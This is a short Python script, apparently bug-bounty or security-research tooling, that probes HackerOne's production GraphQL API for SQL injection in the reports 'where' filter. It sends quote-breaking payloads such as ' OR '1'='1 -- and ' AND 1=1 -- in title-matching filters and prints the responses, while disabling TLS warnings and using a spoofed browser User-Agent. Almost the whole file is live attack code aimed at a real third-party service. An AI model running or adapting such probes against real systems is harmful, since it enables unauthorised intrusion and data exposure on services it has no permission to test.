# -*- coding: utf-8 -*-
"""h1x49b: reports where 谓词 SQL 注入探测(匿名;只读 payload)
引号用 chr(39) 构造避免转义地狱"""
import sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0'})
Q = chr(39)  # '

def qr(name, where_expr):
    q = '{ reports(where: %s) { total_count } }' % where_expr
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': q}, timeout=20)
        print(f'--- {name} ---')
        print(f'  [{r.status_code}] {r.text[:300]}')
    except Exception as e:
        print(f'--- {name} ERR {e} ---')

qr('base_like_a', '{title: {_like: "%a%"}}')
qr('q_quote_only', "{title: {_like: \"%" + Q + "%\"}}")
qr('q_or', "{title: {_like: \"%" + Q + " OR " + Q + "1" + Q + "=" + Q + "1 --\"}}")
qr('q_and', "{title: {_like: \"%" + Q + " AND 1=1 --\"}}")
qr('q_ilike_or', "{title: {_ilike: \"%" + Q + " OR " + Q + "1" + Q + "=" + Q + "1 --\"}}")
qr('q_similar', '{title: {_similar: "%(a|b)%"}}')
qr('q_similar_or', "{title: {_similar: \"%" + Q + " OR " + Q + "1" + Q + "=" + Q + "1 --\"}}")
qr('q_idlike', '{id_like: 5}')
qr('q_int_in', '{id: {_in: [1, 2]}}')
qr('q_int_eq', '{id: {_eq: 3732660}}')
qr('q_or_nest', '{_or: [{title: {_like: "%a%"}}, {title: {_like: "%b%"}}]}')
qr('q_gt_str', "{title: {_gt: \"" + Q + "\"}}")
